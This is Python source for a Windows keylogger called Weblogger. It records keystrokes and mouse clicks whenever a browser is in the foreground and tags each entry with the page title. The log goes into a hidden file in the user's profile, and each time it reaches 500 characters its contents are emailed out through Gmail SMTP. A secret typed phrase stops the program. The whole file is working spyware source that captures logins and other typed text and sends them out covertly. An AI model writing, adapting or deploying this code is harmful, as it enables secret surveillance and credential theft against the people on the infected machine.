# -*- coding: utf-8 -*-

from win32gui import GetWindowText, GetForegroundWindow
from time import sleep
from os import path, environ, remove
from pynput.keyboard import Key, Listener
from pynput.mouse import Button, Listener as mouseListener
import re
import signal
import sys
import subprocess


class Weblogger(object):
    BROWSERS = ['google chrome', 'mozilla firefox', 'microsoft edge', 'safari', 'internet explorer']
    GMAIL_DATA = {'user': '', 'passwd': ''}
    MAX_DATA_LEN = 500
    LOGGING = False
    IGNORE_HOLD = [Key.alt, Key.alt_l, Key.alt_r, Key.alt_gr,
                   Key.ctrl, Key.ctrl_l, Key.ctrl_r,
                   Key.shift, Key.shift_l, Key.shift_r,
                   Key.esc, Key.home, Key.end]

    def __init__(self, email_to=""):
        self.log_file = path.join(environ['userprofile'], 'log.txt')
        self.email_to = email_to
        self.w_name = ""
        self.w_title = ""
        self.browser_title = ""
        self.last_title = ""
        self.command = ""
        self.is_thread_running = False
        self.last_key = None

        self.create_file()

        subprocess.call('attrib +h ' + self.log_file, shell=True)

    def create_file(self):
        if not path.exists(self.log_file):
            self.last_title = ""
            self.browser_title = ""

            with open(self.log_file, 'w') as fw:
                fw.write('')

    def is_browser_open(self, update_titles=True):
        window = GetWindowText(GetForegroundWindow())
        self.w_name = window.split(' - ')[-1]
        self.w_title = ' - '.join(window.split(' - ')[:-1])

        if self.w_name.lower() in self.BROWSERS:
            if update_titles:
                self.last_title = self.browser_title
                self.browser_title = self.w_title
            return True
        else:
            if update_titles:
                self.last_title = self.browser_title
                self.browser_title = ""
            return False

    def start_logging(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            self.is_thread_running = True

            with mouseListener(on_click=self.on_click) as mouse_listener:
                mouse_listener.join()

            listener.join()

    def stop_logging(self):
        self.is_thread_running = False
        return False

    def kill(self, sig=None, frame=None):
        self.is_thread_running = False
        self.send_log()
        sys.exit()

    def on_press(self, key):
        if not self.is_browser_open():
            return self.stop_logging()

        if self.browser_title != self.last_title:
            self.write_log('\n========== %s ==========\n' % self.browser_title)

        key_pressed = self.get_pressed_key(key)

        if key != self.last_key or key not in self.IGNORE_HOLD:
            self.last_key = key
            self.write_log(key_pressed)

    def on_release(self, key):
        if key in self.IGNORE_HOLD and "u'" not in str(key):
            key_released = '<%s.released>' % str(key)
            self.write_log(key_released)

    def on_click(self, x, y, button, pressed):
        if not self.is_browser_open(update_titles=False):
            return self.stop_logging()

        if pressed and self.last_key and button == Button.left and self.last_key != button:
            self.last_key = button
            self.write_log('<Mouse.click>')

    def write_log(self, text):
        text = self.translate(text)
        self.command += text

        if self.LOGGING:
            print(text)

        with open(self.log_file, 'a') as lf:
            lf.write(text)

        self.check_command()

        with open(self.log_file, 'r') as lf:
            data = lf.read()
            data_length = len(data)

        if data_length >= self.MAX_DATA_LEN:
            if self.LOGGING:
                print('Length: %d' % data_length)
            self.send_mail(data)

    def check_command(self):
        KILL = 'webloggerkill'
        length = len(self.command)

        if self.command != KILL[0:length]:
            self.command = ''
        elif length == len(KILL):
            if self.LOGGING:
                print('Matando processo')
            self.kill()

    def send_mail(self, text):
        if not self.email_to or not all(self.GMAIL_DATA.values()):
            if self.LOGGING:
                print('Mail Not Sent')
            return

        if self.LOGGING:
            print('Sending Mail')

        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        import smtplib

        email_from = "%s@gmail.com" % self.GMAIL_DATA['user']
        text = self.translate_shift_key(text)

        msg = MIMEMultipart()
        msg["From"] = 'WebLogger'
        msg["To"] = 'Me'
        msg["Subject"] = 'Logs from weblogger'
        msg.attach(MIMEText(text, _subtype='plain'))

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(self.GMAIL_DATA['user'], self.GMAIL_DATA['passwd'])
        server.sendmail(email_from, self.email_to, msg.as_string())
        server.quit()

        remove(self.log_file)
        self.create_file()

    def send_log(self):
        with open(self.log_file, 'r') as lf:
            data = lf.read()
            data_length = len(data)

        if data_length >= 1:
            if self.LOGGING:
                print('Length: %d' % data_length)
            self.send_mail(data)

    @staticmethod
    def get_pressed_key(key):
        str_key = str(key)

        if "u'" in str_key:
            if '\\' in str_key:
                pressed = chr(key.vk + 32)
            else:
                pressed = str(key.char)
        else:
            pressed = '<%s>' % str_key

        return pressed

    @staticmethod
    def translate(key):
        translate_keys = {
            "<Mouse.click>": "\n",
            "<Key.space>": " ",
            "<Key.enter>": "\n",
            "<Key.tab>": "    "
        }

        return translate_keys.get(key, key)

    @staticmethod
    def translate_shift_key(text):
        translate_keys = {
            '1': '!',
            '2': '@',
            '3': '#',
            '4': '$',
            '5': '%',
            '6': '¨',
            '7': '&',
            '8': '*',
            '9': '(',
            '0': ')',
            '-': '_',
            '=': '+',
            '/': '?',
            ';': ':',
            ',': '<',
            '.': '>',
        }

        findall = re.findall(r'<Key\.shift>(\S*?)<Key\.shift\.released>', text)

        for f in findall:
            r_from = '<Key.shift>%s<Key.shift.released>' % f

            if f.isalpha():
                text = text.replace(r_from, f.upper())
            else:
                sub_stream = ''
                for c in f:
                    if c.isalpha():
                        sub_stream += c.upper()
                    else:
                        sub_stream += translate_keys.get(c, '<Key.shift>%s<Key.shift.released>' % c)

                text = text.replace(r_from, sub_stream)

        return text


if __name__ == '__main__':
    wl = Weblogger(email_to="")
    signal.signal(signal.SIGTERM, wl.kill)
    signal.signal(signal.SIGINT, wl.kill)
    signal.signal(signal.SIGILL, wl.kill)
    signal.signal(signal.SIGABRT, wl.kill)
    signal.signal(signal.SIGFPE, wl.kill)
    signal.signal(signal.SIGSEGV, wl.kill)

    while True:
        if wl.is_browser_open(update_titles=False) and not wl.is_thread_running:
            wl.start_logging()

        sleep(1)
